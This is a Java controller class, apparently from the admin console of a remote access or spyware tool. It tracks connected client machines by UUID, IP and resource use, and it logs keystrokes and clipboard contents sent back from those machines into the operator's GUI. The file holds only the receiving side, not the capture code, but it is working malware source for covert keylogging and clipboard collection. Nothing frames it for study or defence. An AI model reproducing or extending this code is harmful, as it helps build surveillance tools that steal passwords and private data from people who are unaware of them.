package controllers;

import admin.Admin;
import controllers.base.ConsumeExecutable;
import models.ClientModel;
import org.json.JSONArray;
import org.json.JSONObject;
import utils.console;

import java.util.HashMap;
import java.util.Map;
import java.util.Vector;

import static utils.Command.*;

public class ConsumeController {

    private static Map<String, ConsumeExecutable<JSONObject>> controller = new HashMap();

    public static void init() {
        put(COMMAND_GET_ALL_CLIENTS, ConsumeController::getAllClients);
        put(COMMAND_MONITORING, ConsumeController::getMonitoring);
        put(COMMAND_CLIPBOARD, ConsumeController::getClipboard);
        put(COMMAND_KEYLOGGER, ConsumeController::getKeylogger);
    }

    private static void getKeylogger(JSONObject input, Admin admin) {
        JSONArray logs = new JSONArray(input.get("keylogger").toString());
        logs.forEach(log -> {
            Admin.getGui().appendLog("[Keylog] " + log.toString());
        });
    }

    private static void getClipboard(JSONObject input, Admin admin) {
        Admin.getGui().appendLog("[Clipboard] " + input.get("clipboard").toString());
    }

    private static void getAllClients(JSONObject input, Admin admin) {
        HashMap clients = admin.getClients();
        JSONArray arr = new JSONArray(input.get("clients").toString());
        arr.forEach(e -> {
            JSONObject json = new JSONObject(e.toString());
            Vector<String> si = new Vector<>();
            si.add(json.get("UUID").toString());
            si.add(json.get("cpu").toString());
            si.add(json.get("ram").toString());
            si.add(json.get("disk").toString());
            si.add(json.get("ip").toString());
            clients.putIfAbsent(si.get(0), new ClientModel(
                    si.get(0),
                    si.get(1),
                    si.get(2),
                    si.get(3),
                    si.get(4)));
        });
    }

    private static void getMonitoring(JSONObject input, Admin admin) {
        Admin.getGui().updateProgressBar(
                input.getInt("cpu"),
                input.getInt("ram"),
                input.getInt("disk")
        );
    }

    public static ConsumeExecutable get(String key) {
        return controller.getOrDefault(key, ConsumeController::getNotFoundController);
    }

    private static void getNotFoundController(JSONObject jsonObject, Admin admin) throws Exception {
        throw new Exception("Invalid Command");
    }

    public static ConsumeExecutable put(String key, ConsumeExecutable<JSONObject> value) {
        return controller.put(key, value);
    }
}
